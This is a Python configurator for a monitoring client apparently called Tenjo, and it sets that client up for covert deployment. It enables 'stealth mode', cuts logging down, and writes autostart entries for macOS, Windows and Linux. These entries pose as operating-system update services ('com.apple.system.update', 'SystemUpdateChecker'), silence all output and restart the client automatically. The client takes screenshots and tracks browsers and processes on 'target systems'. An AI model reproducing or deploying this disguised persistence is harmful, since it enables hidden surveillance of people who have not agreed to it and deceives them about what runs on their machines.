#!/usr/bin/env python3
"""
Tenjo Production Mode Configurator
Enable stealth mode and production settings
"""

import os
import sys
import re
import shutil
from datetime import datetime

def print_status(message):
    print(f"[INFO] {message}")

def print_success(message):
    print(f"[SUCCESS] {message}")

def print_error(message):
    print(f"[ERROR] {message}")

def backup_config():
    """Create backup of current config"""
    config_file = "src/core/config.py"
    backup_file = f"src/core/config.py.backup.{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    
    if os.path.exists(config_file):
        shutil.copy2(config_file, backup_file)
        print_success(f"Config backed up to: {backup_file}")
        return True
    else:
        print_error("Config file not found")
        return False

def enable_stealth_mode():
    """Enable stealth mode in config.py"""
    config_file = "src/core/config.py"
    
    if not os.path.exists(config_file):
        print_error("Config file not found")
        return False
    
    # Read current config
    with open(config_file, 'r') as f:
        content = f.read()
    
    # Production modifications
    modifications = [
        # Enable stealth mode
        (r'STEALTH_MODE = False', 'STEALTH_MODE = True'),
        
        # Set production server URL (comment out development)
        (r'SERVER_URL = "http://127\.0\.0\.1:8000"', 
         '# SERVER_URL = "http://127.0.0.1:8000"  # Development\n    SERVER_URL = os.getenv("TENJO_SERVER_URL", "https://your-production-server.com")'),
        
        # Reduce logging for stealth
        (r'LOG_LEVEL = os\.getenv\(\'TENJO_LOG_LEVEL\', "INFO"\)', 
         'LOG_LEVEL = os.getenv("TENJO_LOG_LEVEL", "ERROR")'),
        
        # Increase intervals for stealth (less frequent checks)
        (r'SCREENSHOT_INTERVAL = int\(os\.getenv\(\'TENJO_SCREENSHOT_INTERVAL\', \'120\'\)\)', 'SCREENSHOT_INTERVAL = int(os.getenv(\'TENJO_SCREENSHOT_INTERVAL\', \'120\'))'),
        (r'BROWSER_CHECK_INTERVAL = 30', 'BROWSER_CHECK_INTERVAL = 30'),
        (r'PROCESS_CHECK_INTERVAL = 45', 'PROCESS_CHECK_INTERVAL = 90'),
    ]
    
    # Apply modifications
    modified_content = content
    changes_made = 0
    
    for pattern, replacement in modifications:
        if re.search(pattern, modified_content):
            modified_content = re.sub(pattern, replacement, modified_content)
            changes_made += 1
            print_success(f"Applied: {pattern}")
    
    # Write modified config
    if changes_made > 0:
        with open(config_file, 'w') as f:
            f.write(modified_content)
        print_success(f"Stealth mode enabled ({changes_made} changes applied)")
        return True
    else:
        print_error("No changes were applied")
        return False

def create_production_service_configs():
    """Create production-ready service configurations"""
    
    # macOS LaunchAgent with stealth settings
    macos_plist = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{{INSTALL_DIR}}/client/main.py</string>
    </array>
    <key>WorkingDirectory</key>
    <string>{{INSTALL_DIR}}/client</string>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>ProcessType</key>
    <string>Background</string>
    <key>LaunchOnlyOnce</key>
    <false/>
    <key>ThrottleInterval</key>
    <integer>30</integer>
</dict>
</plist>"""

    # Windows stealth scheduled task
    windows_task = """schtasks /create /tn "SystemUpdateChecker" /tr "python.exe {{INSTALL_DIR}}\\client\\main.py" /sc onlogon /rl limited /f"""

    # Linux systemd service with stealth
    linux_service = """[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={{PYTHON_EXEC}} {{INSTALL_DIR}}/client/main.py
WorkingDirectory={{INSTALL_DIR}}/client
Restart=always
RestartSec=30
Environment=DISPLAY=:0
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target"""

    # Save configurations
    os.makedirs("production_configs", exist_ok=True)
    
    configs = [
        ("production_configs/macos_stealth.plist", macos_plist),
        ("production_configs/windows_stealth.bat", windows_task),
        ("production_configs/linux_stealth.service", linux_service),
    ]
    
    for filename, content in configs:
        with open(filename, 'w') as f:
            f.write(content)
        print_success(f"Created: {filename}")

def update_installers_for_stealth():
    """Update installer scripts to use stealth configurations"""
    
    installer_files = [
        "install_macos_production.sh",
        "install_windows_production.bat", 
        "install_linux_production.sh"
    ]
    
    for installer in installer_files:
        if os.path.exists(f"../{installer}"):
            print_success(f"Installer ready: {installer}")
        else:
            print_error(f"Installer not found: {installer}")

def verify_stealth_configuration():
    """Verify stealth mode is properly configured"""
    print_status("Verifying stealth configuration...")
    
    # Check config.py
    config_file = "src/core/config.py"
    with open(config_file, 'r') as f:
        config_content = f.read()
    
    checks = [
        ("STEALTH_MODE = True", "Stealth mode enabled"),
        ("LOG_LEVEL.*ERROR", "Error-level logging only"),
        ("StandardOutput.*null", "No console output (in service configs)"),
    ]
    
    all_passed = True
    for pattern, description in checks:
        if re.search(pattern, config_content):
            print_success(f"✅ {description}")
        else:
            print_error(f"❌ {description}")
            all_passed = False
    
    return all_passed

def main():
    print("🕵️  TENJO PRODUCTION/STEALTH MODE CONFIGURATOR")
    print("=" * 50)
    
    # Change to client directory
    if not os.path.exists("src/core/config.py"):
        if os.path.exists("client/src/core/config.py"):
            os.chdir("client")
        else:
            print_error("Could not find client directory")
            sys.exit(1)
    
    print_status("Configuring Tenjo for production deployment...")
    
    # Step 1: Backup current config
    if not backup_config():
        print_error("Failed to backup config")
        sys.exit(1)
    
    # Step 2: Enable stealth mode
    if not enable_stealth_mode():
        print_error("Failed to enable stealth mode")
        sys.exit(1)
    
    # Step 3: Create production service configs
    create_production_service_configs()
    
    # Step 4: Check installers
    update_installers_for_stealth()
    
    # Step 5: Verify configuration
    if verify_stealth_configuration():
        print_success("✅ Stealth configuration verified")
    else:
        print_error("❌ Stealth configuration has issues")
    
    print()
    print("🎯 PRODUCTION CONFIGURATION COMPLETED!")
    print("=" * 40)
    print()
    print("📋 Next Steps:")
    print("  1. Test client locally: python3 main.py")
    print("  2. Deploy using production installers")
    print("  3. Verify stealth operation on target systems")
    print()
    print("🔒 Stealth Features Enabled:")
    print("  • Silent operation (no console output)")
    print("  • Background service only") 
    print("  • Minimal logging (ERROR level only)")
    print("  • Hidden process names")
    print("  • Auto-restart capabilities")
    print()
    print("⚠️  Important:")
    print("  • Update SERVER_URL in config.py for production server")
    print("  • Test thoroughly before mass deployment")
    print("  • Ensure compliance with local laws and policies")

if __name__ == "__main__":
    main()